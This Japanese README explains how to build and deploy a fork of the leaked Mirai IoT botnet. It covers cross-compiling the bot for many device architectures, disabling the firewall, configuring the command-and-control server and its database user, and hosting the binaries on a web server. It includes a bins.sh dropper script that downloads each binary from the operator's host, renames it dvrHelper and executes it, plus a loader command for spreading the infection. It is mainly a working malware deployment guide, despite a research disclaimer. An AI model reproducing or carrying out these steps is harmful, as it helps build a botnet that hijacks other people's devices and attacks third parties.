# Mirai BotNet to Tashiro(未来砲)
<!--

  ,～（（((((((～～､
  (  ＿（（ (((＿　)
  |/　~^^＼)／^^~ヽ|
  |　　＿　《　＿   |
 (|-(_//_)-(_//_)-|）
  |　　 　厶､　　   |     ／￣￣￣￣￣￣￣￣￣￣￣
  ＼   ||||||||　／　　＜  Mirai BotNet to Tashiro.
    ＼_________／       ＼＿＿＿＿＿＿＿＿＿＿＿

-->
コンパイル方法を少し簡略化し、若干の修正を加えています。
Mirai BotNet to Tashiroという名前にしていますが、普通に未来砲でいいです。

バグ等などありましたら[@ware255](https://mobile.twitter.com/ware255)まで教えてください。

https://github.com/jgamblin/Mirai-Source-Code より抜粋<br />
ちょっとだけ以下のURLを参考にさせていただきました。<br />
https://gist.github.com/ppoffice/86beb0f90de5aeec75aabd517ebc5e43

## 必要条件(注意事項)
* viを使えるようにすること(別にnanoでもいい)。
* WSLやWSL2で実行しないでください(試しましたが、mysqlが使えなかったり、コンパイルができなかったりしました)。
* OSはLinux系のものを使用することを推奨します。

## Credits
[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

## 免責事項
このリポジトリは研究目的であり、本ソフトウェアの使用はあなたの責任です。

## 警告
このレポの[zipファイル](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/)は、いくつかのAVプログラムによってマルウェアとして認識されています。 ご注意ください。

## 未来砲のインストール方法

※rootでログインしていない場合は、なるべくsudoをコマンドの先頭に追加して、以下のインストール手順にしたがってください。<br />
※インストールできない場合は、以下のURLを参照してインストールしてください。<br />
https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br />

```
# sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
```
debianをお使いの方は、そのままではmysqlがインストールできないので、以下の方法でインストールしてください。
```
# wget https://dev.mysql.com/get/mysql-apt-config_0.8.22-1_all.deb
# sudo dpkg -i mysql-apt-config_0.8.22-1_all.deb
# sudo apt update && sudo apt install mysql-server mysql-client
```
依存関係ツールのインストールが完了したら、以下のコマンドを実行してください。
```
# git clone https://github.com/ware255/Mirai-Source-Code-plus.git
# cd Mirai-Source-Code-plus/scripts
```
クロスコンパイル！
```
# chmod +x cross-compile.sh
# sudo ./cross-compile.sh
```
`Install mysql-server and mysql-client (y/n)?`と聞かれたら`n`を押してください。以下例です。
```
Install mysql-server and mysql-client (y/n)? n
```
次に`.bashrc`を変更します。
```
# vi ~/.bashrc
```
最後の行に次の文字列を追加してください。
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOPATH=$HOME/go
```
追加して保存した後、次のコマンドを入力します。
```
# mkdir ~/go
# source ~/.bashrc
```
miraiディレクトリに移動して、`build.sh`を実行します。
```
# cd ../mirai
# chmod +x build.sh
# ./build.sh release telnet
```
golang の必要条件を取得する。
```
# go get github.com/go-sql-driver/mysql
# go get github.com/mattn/go-shellwords
```
`iptbales/ip6tables`やファイアウォールをインストールしている場合は、無効にしてください。
```
# sudo service iptables stop
```
データベースの設定！<br />
※パスワードの設定を求められますので、必ず覚えておいてください。
```
# sudo /usr/bin/mysql_secure_installation
```
`cd cnc/`で移動し、先ほど入力したrootパスワードをmain.goを開いてMySQL_Passwordから置き換えてください。
```
const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "MySQL_Password"
const DatabaseTable string  = "mirai"
```
次にmysqlにユーザーを追加します。
```
# cd ../../scripts
# sudo mysql -uroot -pMySQL_Password
> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
> exit
# sudo service mysql restart
```
mysqlサーバーを再起動したら、リリースディレクトリ(`./mirai/release`)に移動し、cncというコンパイルされたファイルを実行します。
```
# cd ../mirai/release
# sudo ./cnc
```
次に、新しいウィンドウを開き(もとソースでは新しいウィンドウを開くこと書いてなかったけどま、いいか)、次のコマンドを実行します。
```
# cd ..
# cp prompt.txt release/
```
次に、telnetで自分のIPアドレスに接続します。<br />
以下は、telnetコマンドの実行例です。
```
# telnet 192.168.19.19
```
OK、ではこのユーザー名とパスワードでログインしてください。この場合、ユーザー名は `tashiro` で、パスワードは `mystrongestpassword` です。

もう一度、Puttyやmobaxtermのようなサーバーターミナルを使用してください。<br />
このディレクトリに移動します ../Mirai-Source-Code/mirai/release
```
# cd ./Mirai-Source-Code/mirai/release
```
次に、Apacheサーバーをインストールし、起動します。
```
# sudo apt install apache2
# sudo service apache2 start
```
miraiのファイルを`/var/www/html`へコピーします。
```
# sudo cp mirai.* /var/www/html
```
ブラウザにインデックスファイルを表示させるには、インデックスを削除する必要があります。
```
# rm /var/www/html/index.html
```
次に、ブラウザを開いて、`http://localhost` またはあなたのIPアドレスを入力し、ファイルが表示されるかどうかを確認します。

終わったら`/var/www/html`に移動し、`bins.sh`を作成します。
```
# cd /var/www/html
# touch bins.sh
```
次に、`bins.sh` を開いて、次のように記述します（`IP OR HOSTNAME:80`のところは自分の持っているvpsのIPか自分のIPアドレスに置き換えてください）。
```
#!/bin/sh

# Edit
WEBSERVER="IP OR HOSTNAME:80"
# Stop editing now 

BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O dvrHelper
	chmod 777 dvrHelper
	./dvrHelper
done

rm -f "
```
vpsをお持ちの方は、`/var/www/html`をsftpでアップロードしてください。<br />
※vpsをお持ちでない方は、そのままで結構です。<br />
本当にアップロードされたかどうかは、私の自身vpsとかあまり詳しくないので、ご自身でお確かめください。

ここで、Apacheサーバーを再起動します。
```
# sudo service apache2 restart
```
次に、`loader`をビルドするために、`Mirai-Source-Code-plus/loader/`に移動し、`loader`をビルドします。<br />
※移動コマンド省略します。
```
# chmod +x build.sh
# ./build.sh
```
と入力し、その後、このコードを入力しますが、ここにファイル名を入れてください --> file.txt ペーストする前に
```
# cat file.txt | ./loader wget http://dyn.com
```
これでインストールは完了です :)<br />
お疲れ様でした。一息ついて、コーヒーでも飲んでください。<br />
※小学生はコーヒーではなくジュースを飲んで一息ついてください。

### 参考資料
https://github.com/jgamblin/Mirai-Source-Code <br />
https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br />

英語での翻訳はDeepLですが、おかしなところがあるのでそこは温かい目でよろしくお願いします。
